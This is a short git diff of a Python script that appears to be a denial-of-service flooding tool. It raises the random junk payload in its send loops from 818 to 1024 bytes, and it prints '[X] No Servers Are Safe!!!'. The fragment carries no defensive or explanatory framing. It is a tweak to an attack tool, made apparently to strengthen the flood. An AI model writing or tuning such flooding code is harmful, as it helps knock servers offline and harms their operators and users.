@@ -27,7 +27,7 @@ threads = int(input(" TIME :"))
 
 os.system("clear")
 def run():
-        data = random._urandom(818)
+        data = random._urandom(1024)
         i = random.choice(("[•]","[•]","[•]"))
         while True:
                 try:
@@ -55,7 +55,7 @@ def run2():
                         print("[X] No Servers Are Safe!!!")
 
 def run3():
-        data = random._urandom(818)
+        data = random._urandom(1024)
         i = random.choice(("[•]","[•]","[•]"))
         while True:
                 try:
